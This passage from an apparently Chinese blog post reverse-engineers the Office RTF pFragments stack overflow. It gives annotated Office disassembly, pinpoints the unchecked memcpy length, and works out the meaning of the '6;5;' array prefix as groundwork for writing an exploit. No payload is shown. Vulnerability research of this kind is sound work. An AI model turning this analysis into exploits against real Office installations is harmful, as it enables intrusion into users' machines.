class="symbol">.text:</span>32E595A7                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_10]             <span class="comment">; arg4: [ebp+0x18] = [0x0011fe1c] = 0x62413362(a6)</span></span><br><span class="line"><span class="symbol">.text:</span>32E595AA                 <span class="keyword">neg</span>     <span class="built_in">eax</span>                      <span class="comment">;   按位取反再加1，eax = 0xbecd9dbf</span></span><br><span class="line"><span class="symbol">.text:</span>32E595AC                 <span class="keyword">sbb</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>                 <span class="comment">;   带借位减法,eax = eax-eax-cf = 0xffffffff</span></span><br><span class="line"><span class="symbol">.text:</span>32E595AE                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_8]         <span class="comment">;   ecx = ebp-8 = 0x0011fe04-8 = 0x0011fdfc </span></span><br><span class="line"><span class="symbol">.text:</span>32E595B1                 <span class="keyword">and</span>     <span class="built_in">eax</span>, <span class="built_in">ecx</span>                 <span class="comment">;   eax = eax&amp;ecx = 0x0011fdfc</span></span><br><span class="line"><span class="symbol">.text:</span>32E595B3                 <span class="keyword">push</span>    <span class="built_in">eax</span>                      <span class="comment">; arg3: eax = 0x0011fdfc </span></span><br><span class="line"><span class="symbol">.text:</span>32E595B4                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_0]              <span class="comment">; arg2: [ebp+8] = [0x0011fe04+8] = [0x0011fe0c] = 0x41386141(a2)</span></span><br><span class="line"><span class="symbol">.text:</span>32E595B7                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+var_10]             <span class="comment">; arg1: [ebp-0x10] = [0x0011fe04-0x10] = [0x0011fdf4] = 0x41306141(pFragments属性起始数据) &lt;----(4)</span></span><br><span class="line"><span class="symbol">.text:</span>32E595BA                 <span class="keyword">call</span>    sub_32E5941B             <span class="comment">;</span></span><br><span class="line"><span class="symbol">.text:</span>32E595BF                 <span class="keyword">test</span>    <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line">    ****************************************************************************************</span><br><span class="line"></span><br><span class="line">        char __userpurge sub_32E5941B@&lt;<span class="built_in">al</span>&gt;(<span class="keyword">int</span> a1@&lt;<span class="built_in">edi</span>&gt;, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5)</span><br><span class="line"></span><br><span class="line">    ****************************************************************************************</span><br><span class="line"><span class="symbol">    .text:</span>32E5941B                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011fe04</span></span><br><span class="line"><span class="symbol">    .text:</span>32E5941C                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">;   ebp = esp = 0x0011fdcc </span></span><br><span class="line"><span class="symbol">    .text:</span>32E5941E                 <span class="keyword">push</span>    <span class="built_in">ecx</span>                      <span class="comment">;   ecx = 0x0011fdfc </span></span><br><span class="line"><span class="symbol">    .text:</span>32E5941F                 <span class="keyword">push</span>    <span class="built_in">ecx</span>                      <span class="comment">;   ecx = 0x0011fdfc </span></span><br><span class="line"><span class="symbol">    .text:</span>32E59420                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                      <span class="comment">;   ebx = 0x05000000 </span></span><br><span class="line"><span class="symbol">    .text:</span>32E59421                 <span class="keyword">xor</span>     <span class="built_in">ebx</span>, <span class="built_in">ebx</span>                 <span class="comment">;   ebx = ebx^ebx = 0x00000000</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59423                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_C], <span class="built_in">ebx</span>         <span class="comment">;   [ebp+0x14] = [0x0011fdcc+0x14] = [0x0011fde0] = 0x62413362(a5)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59426                 <span class="keyword">jnz</span>     short loc_32E59439       <span class="comment">;   不为零跳转，这里跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59428                 <span class="keyword">push</span>    <span class="number">33757061h</span></span><br><span class="line"><span class="symbol">    .text:</span>32E5942D                 <span class="keyword">call</span>    sub_32E6AEA8</span><br><span class="line"><span class="symbol">    .text:</span>32E59432</span><br><span class="line"><span class="symbol">    .text:</span>32E59432 loc_32E59432:                          </span><br><span class="line"><span class="symbol">    .text:</span>32E59432                 <span class="keyword">xor</span>     <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59434</span><br><span class="line"><span class="symbol">    .text:</span>32E59434 loc_32E59434:                          </span><br><span class="line"><span class="symbol">    .text:</span>32E59434                 <span class="keyword">pop</span>     <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59435                 <span class="keyword">leave</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59436                 <span class="keyword">retn</span>    <span class="number">10h</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59439 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59439</span><br><span class="line"><span class="symbol">    .text:</span>32E59439 loc_32E59439:                           </span><br><span class="line"><span class="symbol">    .text:</span>32E59439                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_0], <span class="built_in">ebx</span>         <span class="comment">;   [ebp+0x8] = [0x0011fdcc+0x8] = [0x0011fdd4] = 0x41306141(a2)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E5943C                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_8], <span class="built_in">ebx</span>         <span class="comment">;   [ebp-8] = [0x0011fdcc-8] = [0x0011fdc4] = 0x0011fdfc</span></span><br><span class="line"><span class="symbol">    .text:</span>32E5943F                 <span class="keyword">jz</span>      short loc_32E59451       <span class="comment">;   等于0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59441                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_0]              <span class="comment">; arg2: [ebp+8] = [0x0011fdcc+8] = [0x0011fdd4] = 0x41306141(a2) &lt;----(3)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59444                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_8]         <span class="comment">;   eax = ebp-8 = 0x0011fdc4</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59447                 <span class="keyword">push</span>    <span class="built_in">eax</span>                      <span class="comment">; arg1: eax = 0x0011fdc4</span></span><br><span class="line"><span class="symbol">    .text:</span>32E59448                 <span class="keyword">call</span>    sub_32CF3807             <span class="comment">; </span></span><br><span class="line"><span class="symbol">    .text:</span>32E5944D                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                 <span class="comment">; </span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line">        **************************************************</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> __stdcall sub_32CF3807(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span><br><span class="line"></span><br><span class="line">        **************************************************</span><br><span class="line"><span class="symbol">        .text:</span>32CF3807                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">; ebp = 0x0011fdcc</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF3808                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">; ebp = esp = 0x0011fdb0</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF380A                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_4]         <span class="comment">; eax = [0x0011fdb0+0xc] = [0x0011fdbc] = 0x41306141(a2) &lt;----(2)</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF380D                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, loc_32CF3820[<span class="built_in">eax</span>*<span class="number">8</span>] <span class="comment">; eax = eax*8+0x32CF3820 = 0x3c524228 </span></span><br><span class="line"><span class="symbol">        .text:</span>32CF3814                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>+<span class="number">4</span>]             <span class="comment">; ecx = [0x3c524228+4] = [0x3c52422c] = ???????? 不可访问 &lt;----(1)</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF3817                 <span class="keyword">and</span>     <span class="built_in">ecx</span>, <span class="number">0FFh</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF381D                 <span class="keyword">push</span>    <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF381E                 <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>]</span><br><span class="line"><span class="symbol">        .text:</span>32CF3820 loc_32CF3820:                           <span class="comment">; DATA XREF: sub_32CF3807+6↑o</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF3820                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_0]</span><br><span class="line"><span class="symbol">        .text:</span>32CF3823                 <span class="keyword">call</span>    sub_326CC86E</span><br><span class="line"><span class="symbol">        .text:</span>32CF3828                 <span class="keyword">pop</span>     <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">        .text:</span>32CF3829                 <span class="keyword">retn</span>    <span class="number">8</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;根据以上结果，我们可以知道，<code>此异常</code>是因为<code>栈上的数据</code>已经<code>被破坏</code>了之后，<code>重新读取</code>被破坏区域的栈数据，计算出一个<code>不可访问的地址</code>，并对其进行<code>读取</code>，造成<code>非法内存访问</code>。在函数<code>sub_32E5955E</code>中，通过<code>0x066a55e0</code>处的<code>对象</code>，调用了<code>虚函数sub_327C002C</code>，在这个虚函数中通过<code>memcpy</code>函数将样本中<code>pFragments属性的值</code>复制到<code>栈</code>上，但并<code>未检查</code>其复制长度，造成了<code>栈溢出</code>。pFragments属性数据的<code>源地址</code>和<code>复制数据长度</code>都已经解析完成，并保存在<code>0x066a55e0</code>处的<code>对象</code>的<code>成员变量</code>中。pFragments属性数据在<code>栈</code>上的<code>起始地址</code>为<code>0x0011fdf4</code>，而复制数据的长度为<code>0xc8ac</code>，0x0011fdf4+0xc8ac=0x0012c6a0<code>小于0x00130000</code>，所以没像在<code>Windows XP</code>中那样，在复制数据过程中就触发异常，而是在访问被破坏的栈数据后，造成<code>非法内存访问</code>。</p><h3 id="0x33-pFragments属性数据“6-5-”的含义及其合法值"><a href="#0x33-pFragments属性数据“6-5-”的含义及其合法值" class="headerlink" title="0x33 pFragments属性数据“6;5;”的含义及其合法值"></a>0x33 pFragments属性数据“6;5;”的含义及其合法值</h3><p><strong><code>环境：</code></strong>Win7&amp;Office2007</p><p>&emsp;&emsp;这个点，我看网上的分析文章都没有介绍到，也可能有人写了，我没找到。如果没弄清楚这个，就无法成功编写利用程序，我们需要注意每一个细节，才能最终成功利用一个漏洞。</p><p>&emsp;&emsp;在<code>RTF v1.9.1</code>版本的参考文档中(Document Area-&gt;Drawing Objects-&gt;Drawing Object Properties-&gt;Geometry)，是这样介绍的：</p><table><thead><tr><th style="text-align:center">Property</th><th style="text-align:left">Meaning</th><th style="text-align:center">Type of value</th><th style="text-align:center">Default</th></tr></thead><tbody><tr><td style="text-align:center">pFragments</td><td style="text-align:left">Fragments are optional, additional parts to the shape. They allow the shape to contain multiple paths and parts. This property lists the fragments of the shape.</td><td style="text-align:center">Array</td><td style="text-align:center">Null</td></tr></tbody></table><p>&emsp;&emsp;<code>Fragments</code>是可选的，形状的附加部分。它们允许<code>形状</code>包含多个<code>路径</code>和<code>部件</code>。此属性列出<code>形状</code>的Fragments。其<code>属性值</code>是一个<code>Array</code>，默认值为<code>Null</code>。</p><p>&emsp;&emsp;<code>数组</code>的格式为由<code>分号</code>分隔的<code>数字序列</code>。 <code>第一个数字</code>表示数组中<code>每个元素的大小</code>(以字节为单位)。每个元素的字节数可以是<code>2、4或8</code>。当元素的大小为<code>8</code>时，每个元素表示为<code>一组两个数字</code>，但是根据下面的分析，<code>每组数字</code>使用的括号为<code>&quot;()&quot;</code>，而非<code>&quot;{}&quot;</code>。<code>第二个数字</code>表示数组中的<code>元素数</code>。 例如，<code>方形多边形</code>的点可以写为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;sv 8;4;&#123;0,0&#125;;&#123;100,0&#125;;&#123;100,100&#125;;&#123;0,100&#125;&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这里已经说得<code>比较清楚</code>了，但是这些还不够，我们还需要通过<code>具体的程序</code>来进一步理解。我们需要找到程序中<code>处理这部分的代码</code>，仔细阅读。<code>怎么找到</code>，成为了一个新问题。</p><p><strong><code>找关键位置所用方法：</code></strong></p><blockquote><ul><li>1、前面调试时，<code>关键对象</code>的地址为<code>0x066a55e0</code>，但是每次<code>重新调试</code>，这个对象的位置都会<code>改变</code>，也<code>有可能</code>和<code>之前的调试</code>分配一样的地址。</li><li>2、在<code>Attach</code>目标程序后，对<code>0x066a55e0</code>对象的<code>前0x10字节</code>内存下<code>内存写断点</code>(0x066a55e0的<code>第一个dword</code>为<code>虚表指针</code>，<code>0x066a55ec</code>为<code>复制长度0xc8ac</code>所在对象成员变量的内存地址)。</li><li>3、再运行程序，如果已经执行到之前<code>调试奔溃时</code>代码区域的最顶层函数<code>sub_32E5955E</code>,还未断下来，则关闭调试器，重新<code>再来一遍</code>。</li><li>4、直到某一次程序对<code>关键对象</code>的地址分配到<code>0x066a55e0</code>，则会断在对<code>关键对象</code>初始化的位置，这时栈窗口会出现<code>&quot;pFragments&quot;</code>和<code>&quot;11111111acc8d9e9bdbfaf3c......&quot;</code>的字样，此时的代码就是Office处理<code>&quot;pFragments&quot;属性值</code>的代码片段。</li><li>5、然后根据<code>调用堆栈</code>，可以找到<code>当前函数地址</code>，以及当前函数的<code>调用地址</code>，及其<code>父函数</code>等等。</li></ul></blockquote><p>&emsp;&emsp;如此，我们就已经找到处理<code>&quot;pFragments&quot;属性值</code>的代码片段。对<code>“6;5;”</code>的处理代码应该就在附近，我们对找到的代码片段进行<code>详细分析</code>，本次调试记录中的<code>关键对象</code>地址为<code>0x05D755C8</code>，在<code>MSO_379</code>得到分配，画<code>“&lt;----”</code>的为关键位置，处理后的结果如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br></pre></td><td class="code"><pre><span class="line">*******************************************</span><br><span class="line"></span><br><span class="line">    所属模块: wwlib.dll</span><br><span class="line">    <span class="keyword">int</span> __stdcall sub_31FD724E(<span class="keyword">int</span> *a1)</span><br><span class="line"></span><br><span class="line">*******************************************</span><br><span class="line"><span class="symbol">.text:</span>31FD724E                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                          <span class="comment">;   ebp = 0x0011DD20</span></span><br><span class="line"><span class="symbol">.text:</span>31FD724F                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                     <span class="comment">;   ebp = esp = 0x0011B268</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7251                 <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">64h</span>                     <span class="comment">;   esp = esp-0x64 = 0x0011B204</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7254                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                          <span class="comment">;   ebx = 0x00594264</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7255                 <span class="keyword">push</span>    <span class="built_in">esi</span>                          <span class="comment">;   esi = 0x05D66800</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7256                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+arg_0]             <span class="comment">;   esi = [ebp+8] = [0x0011B268+8] = [0x0011B270] = 0x00594264(a1) &lt;----</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7259                 <span class="keyword">mov</span>     <span class="built_in">ebx</span>, [<span class="built_in">esi</span>]                   <span class="comment">;   ebx = [esi] = [0x00594264] = 0x02340000 &lt;---- </span></span><br><span class="line"><span class="symbol">.text:</span>31FD725B                 <span class="keyword">and</span>     [<span class="built_in">ebp</span>+arg_0], <span class="number">0</span>               <span class="comment">;   [ebp+8]&amp;0 = 0x00594264&amp;0 = 0x0</span></span><br><span class="line"><span class="symbol">.text:</span>31FD725F                 <span class="keyword">push</span>    <span class="built_in">edi</span>                          <span class="comment">;   edi = 0x020B4500,ASCII "pFragments"</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7260                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebx</span>+<span class="number">8Ch</span>]               <span class="comment">;   edi = [ebx+0x8c] = [0x0234008c] = 0x05D66800</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7266                 <span class="keyword">push</span>    <span class="number">0</span>                            <span class="comment">; arg2: 0</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7268                 <span class="keyword">push</span>    <span class="built_in">edi</span>                          <span class="comment">; arg1: edi = 0x05D66800(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7269                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_10], <span class="built_in">ebx</span>            <span class="comment">;   [ebp-0x10] = [0x0011B258] = 0x02340000</span></span><br><span class="line"><span class="symbol">.text:</span>31FD726C                 <span class="keyword">call</span>    sub_312C7431                 <span class="comment">;   </span></span><br><span class="line"><span class="symbol">.text:</span>31FD7271                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">edi</span>+<span class="number">556h</span>]              <span class="comment">;   edi = [edi+0x556] = [0x05D66D56] = 0x020D0E00(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7277                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebx</span>+<span class="number">761Ch</span>]             <span class="comment">;   eax = [ebx+0x761] = [0x02340761] = 0x05D7E120</span></span><br><span class="line"><span class="symbol">.text:</span>31FD727D                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_64]            <span class="comment">;   ecx = ebp-0x64 = 0x0011B268-0x64 = 0x0011B204</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7280                 <span class="keyword">push</span>    <span class="built_in">ecx</span>                          <span class="comment">; arg3: ecx = 0x0011B204</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7281                 <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">7670h</span>]        <span class="comment">; arg2: [ebx+0x7670] = [0x02347670] = 0x020B4500,ASCII "pFragments" &lt;----</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7287                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_14], <span class="built_in">eax</span>            <span class="comment">;   [ebp-0x14] = [0x0011B254] = eax = 0x05D7E120</span></span><br><span class="line"><span class="symbol">.text:</span>31FD728A                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">edi</span>]                   <span class="comment">;   eax = [edi] = [0x020D0E00] = 0x329D4ED4(虚表指针)</span></span><br><span class="line"><span class="symbol">.text:</span>31FD728C                 <span class="keyword">push</span>    <span class="built_in">edi</span>                          <span class="comment">; arg1: edi = 0x020D0E00(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>31FD728D                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_18], <span class="built_in">edi</span>            <span class="comment">;   [ebp-0x18] = [0x0011B250] = edi = 0x020D0E00(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7290                 <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">158h</span>]         <span class="comment">; [eax+0x158] = [0x329D4ED4+0x158] = [0x329D502C] = 0x329202C7(虚函数地址)</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line">    *****************************************************************************</span><br><span class="line"></span><br><span class="line">        所属模块: mso.dll</span><br><span class="line">        signed <span class="keyword">int</span> __stdcall sub_329202C7(<span class="keyword">int</span> a1, const CHAR *a2, _<span class="built_in">DWORD</span> *a3)</span><br><span class="line"></span><br><span class="line">    *****************************************************************************</span><br><span class="line"><span class="symbol">    .text:</span>329202C7                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                          <span class="comment">;   ebp = 0x0011B268</span></span><br><span class="line"><span class="symbol">    .text:</span>329202C8                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                     <span class="comment">;   ebp = esp = 0x0011B1E4</span></span><br><span class="line"><span class="symbol">    .text:</span>329202CA                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_4]                  <span class="comment">; arg3: [ebp+0xc] = [0x0011B1E4+0xC] = [0x0011B1F0] = 0x020B4500(a2),ASCII "pFragments"</span></span><br><span class="line"><span class="symbol">    .text:</span>329202CD                 <span class="keyword">push</span>    <span class="number">1</span>                            <span class="comment">; arg2: 0x1</span></span><br><span class="line"><span class="symbol">    .text:</span>329202CF                 <span class="keyword">call</span>    MSO_7788                     <span class="comment">; </span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line"><span class="symbol">        .text:</span><span class="number">32604566</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, dword_33426764          <span class="comment">; eax = [0x33426764] = 0x32600000(ImageBase)</span></span><br><span class="line"><span class="symbol">        .text:</span>3260456B                 <span class="keyword">retn</span>                                 <span class="comment">;</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>329202D4                 <span class="keyword">push</span>    <span class="built_in">eax</span>                          <span class="comment">; arg1: eax = 0x32600000(ImageBase)</span></span><br><span class="line"><span class="symbol">    .text:</span>329202D5                 <span class="keyword">call</span>    MSO_763                      <span class="comment">; 对"pFragments"进行一些操作，如转化为Unicode，并在前面加上"pFragments"的ASCII形式的长度</span></span><br><span class="line"><span class="symbol">    .text:</span>329202DA                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="number">0FFFFh</span>                  <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202DF                 <span class="keyword">jz</span>      loc_32D8FCA5                 <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202E5                 <span class="keyword">push</span>    <span class="built_in">esi</span>                          <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202E6                 <span class="keyword">push</span>    <span class="built_in">edi</span>                          <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202E7                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+arg_8]             <span 